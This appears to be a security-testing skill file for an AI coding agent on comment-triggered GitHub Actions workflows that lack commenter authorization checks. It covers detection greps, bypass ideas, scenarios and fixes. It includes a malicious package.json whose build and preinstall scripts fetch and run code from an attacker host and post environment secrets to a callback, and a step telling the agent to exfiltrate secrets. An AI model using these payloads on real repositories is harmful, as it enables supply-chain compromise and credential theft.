---
name: cicd-bot-command-injection
description: >
  Use when hunting CI/CD bot comment command vulnerabilities where issue_comment or
  pull_request_review_comment triggers invoke privileged workflows without verifying
  the commenter's identity or authorization. Trigger on: "bot command injection",
  "issue_comment trigger", "@github-actions", "slash command CI", "CI bot command",
  "comment triggered workflow", "unauthenticated bot", "github-actions publish",
  "comment dispatch", no authorization check on workflow_dispatch from comment,
  chatops CI/CD, supply chain via PR comment.
license: MIT
compatibility: Designed for Claude Code. Requires read access to .github/workflows/.
metadata:
  category: cicd
  version: "0.1"
  source: https://www.landh.tech/blog/20251003-36m-installs/
  source_types: blog_post
---

# CI/CD Bot Command Injection

## What Is Broken and Why

Some repositories implement "ChatOps" patterns where maintainers post special comments
(e.g., `@bot publish`, `/deploy staging`) to trigger CI/CD workflows. The `issue_comment`
and `pull_request_review_comment` triggers run in the base repository context with access
to secrets. When the workflow fails to verify that the commenter is an authorized maintainer
before checking out and running PR code, any repository contributor (or in public repos,
anyone) can trigger privileged jobs — including those that publish packages, deploy to
production, or access sensitive tokens.

## Key Signals

- `on: issue_comment` or `on: pull_request_review_comment` trigger
- Workflow body checks `github.event.comment.body` for a command string (e.g., `contains(..., 'publish')`)
- No `github.actor` membership check against an allowlist or team
- Workflow subsequently checks out the PR's merge commit or head SHA
- Secrets (`NPM_TOKEN`, `AWS_*`, deploy keys) accessible in the triggered job
- `uses: ./.github/workflows/cmd-*.yml` pattern — bot delegates to another reusable workflow that has secrets
- Environment with "zero protection rules" used in publish/deploy job

## Methodology

1. Enumerate `issue_comment` and `pull_request_review_comment` triggers:
   ```bash
   grep -rln 'issue_comment\|pull_request_review_comment' .github/workflows/
   ```
2. Read the workflow — find what command string it listens for:
   ```bash
   grep -A10 'issue_comment' .github/workflows/WORKFLOW.yml | grep 'contains\|startsWith\|body'
   ```
3. Check for authorization verification:
   ```bash
   grep 'github.actor\|team\|collaborator\|permission' .github/workflows/WORKFLOW.yml
   ```
4. If no actor check — any commenter can trigger it.
5. Trace what the triggered workflow does: does it checkout PR code? Does it have secrets?
6. Open a PR (or find an existing one) and post the trigger comment.
7. Monitor workflow run to confirm execution and exfiltrate secrets.

## Payloads & Tools

```bash
# Trigger a vulnerable bot command (GraphQL-JS pattern)
gh pr comment PR_NUMBER --body "@github-actions publish-pr-on-npm"

# Generic slash command
gh issue comment ISSUE_NUMBER --body "/deploy production"
gh pr comment PR_NUMBER --body "/publish canary"
gh pr comment PR_NUMBER --body "@bot release"

# Find the exact command string from workflow file
grep -r 'contains.*comment.*body\|startsWith.*comment.*body' .github/workflows/
```

```json
// Malicious package.json in PR branch — runs when bot triggers npm build
{
  "scripts": {
    "build": "node legit-build.js && curl -sSfL https://ATTACKER/r.js | node",
    "preinstall": "curl -d @/proc/self/environ https://CALLBACK"
  }
}
```

```bash
# Check if environment has protection rules (zero rules = secrets freely available)
gh api repos/ORG/REPO/environments/ENV_NAME | jq '.protection_rules'
# Empty array = no required reviewers = secrets accessible to any triggered job
```

## Bypass Techniques

- **No actor check**: if the workflow only checks `contains(github.event.comment.body, '/publish')` without also verifying `github.actor` is a maintainer, any user can trigger it
- **Actor check bypass via username spoofing**: some checks use `github.actor == 'dependabot[bot]'` — if the real bot account is also allowed, look for ways to impersonate naming patterns
- **Reusable workflow secrets passthrough**: bot workflow passes secrets to a reusable workflow via `secrets: inherit` or explicit `secrets:` block — check if the reusable workflow has weaker authorization
- **Comment on old PRs**: PRs don't need to be open — commenting on a merged or closed PR may still trigger the workflow if the condition only checks PR existence
- **Environment with zero protection rules**: even if the main workflow is locked down, the publish environment may have no required reviewers, allowing automated jobs to access its secrets without manual approval

## Exploitation Scenarios

**Scenario 1 — NPM canary token via comment command (GraphQL-JS pattern)**
Setup: `issue_comment` workflow triggers on `@github-actions publish-pr-on-npm`, no actor authorization check. Workflow checks out PR merge commit, runs `npm run build:npm`, then publishes with `NPM_CANARY_PR_PUBLISH_TOKEN` in a zero-protection environment.
Trigger: Attacker opens PR with malicious `build:npm` script, posts `@github-actions publish-pr-on-npm` comment.
Impact: Build job executes attacker code → poisons cache → publish job restores poisoned cache → `NPM_CANARY_PR_PUBLISH_TOKEN` exfiltrated. Attacker can publish malicious canary versions affecting downstream consumers (Apollo, Relay).

**Scenario 2 — Deploy key exposure via slash command**
Setup: Repository uses `/deploy staging` comment to trigger deployment workflow. No check that commenter is a maintainer. Deployment workflow has `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`.
Trigger: Attacker (with read access to repo) posts `/deploy staging` on any open PR.
Impact: Deployment workflow runs with attacker's PR code in staging environment — arbitrary code execution with AWS credentials.

**Scenario 3 — Secrets via zero-protection environment**
Setup: Bot workflow triggers on comment, passes secrets to reusable workflow via `secrets: inherit`. The reusable workflow uses `environment: production` which has zero protection rules.
Trigger: Attacker triggers the comment command.
Impact: Production secrets accessible to the job without any manual approval step — attacker receives full production credentials.

## False Positives

- Workflow checks `github.actor` against a hardcoded allowlist or org team membership before proceeding
- Comment command only triggers read-only operations (posting status, running linters) — no secrets in scope
- Environment has required reviewers — a human must approve before secrets are released to the job
- Workflow runs in a sandbox with no secret access (permissions: `{}` or only `pull-requests: write`)

## Fix Patterns

```yaml
# WRONG: no actor authorization check
on:
  issue_comment:
    types: [created]
jobs:
  publish:
    if: contains(github.event.comment.body, '@bot publish')
    steps:
      - run: npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

# CORRECT: verify commenter is a repo collaborator with write access
jobs:
  check-permission:
    runs-on: ubuntu-latest
    outputs:
      allowed: ${{ steps.check.outputs.result }}
    steps:
      - id: check
        uses: actions/github-script@v7
        with:
          script: |
            const { data } = await github.rest.repos.getCollaboratorPermissionLevel({
              owner: context.repo.owner,
              repo: context.repo.repo,
              username: context.actor
            });
            return ['admin', 'write'].includes(data.permission);
  publish:
    needs: check-permission
    if: needs.check-permission.outputs.allowed == 'true'
```

- Always verify `github.actor` has write/maintain/admin permission before running privileged jobs triggered by comments
- Use `environments:` with required reviewers for any job that accesses publish or deploy secrets
- Separate the build (runs attacker code, no secrets) from the publish (no attacker code, has secrets)
- Prefer `workflow_dispatch` with explicit input validation over comment-triggered commands

## Related Skills

[[github-actions-script-injection]] shares the same root cause: untrusted user-supplied input (a comment body vs. a branch name) reaches a shell execution context without sanitization. Once a bot command triggers a build of attacker-controlled PR code, the exploit path continues into [[pwn-request]] territory — `preinstall` scripts in the checked-out `package.json` run with workflow permissions. A zero-protection environment accessed via bot command can also be reached via [[github-actions-cache-poisoning]] if the bot workflow shares a cache key with a privileged workflow.
